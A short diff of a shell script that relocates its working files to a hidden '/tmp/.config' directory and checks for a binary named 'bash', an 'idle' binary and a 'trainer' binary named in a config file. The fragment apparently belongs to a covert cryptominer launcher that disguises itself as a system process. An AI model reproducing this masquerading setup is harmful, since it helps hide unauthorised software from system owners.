@@ -3,16 +3,16 @@
 interval="15"
 execName="bash"
 idleName="idle"
-execBase="/root/.config"
+work="/tmp/.config"
 
 
-[ -f "${execBase}/appsettings.json" ] || exit 1
-trainerName=`cat "${execBase}/appsettings.json" |grep '"cpuName":' |cut -d'"' -f4`
+[ -f "${work}/appsettings.json" ] || exit 1
+trainerName=`cat "${work}/appsettings.json" |grep '"cpuName":' |cut -d'"' -f4`
 [ -n "$trainerName" ] || exit 1
-trainerPath="${execBase}/${trainerName}"
-execPath="${execBase}/${execName}"
+trainerPath="${work}/${trainerName}"
+execPath="${work}/${execName}"
 [ -f "$execPath" ] || exit 1
-idlePath="${execBase}/${idleName}"
+idlePath="${work}/${idleName}"
 [ -f "$idlePath" ] || exit 1
 
 
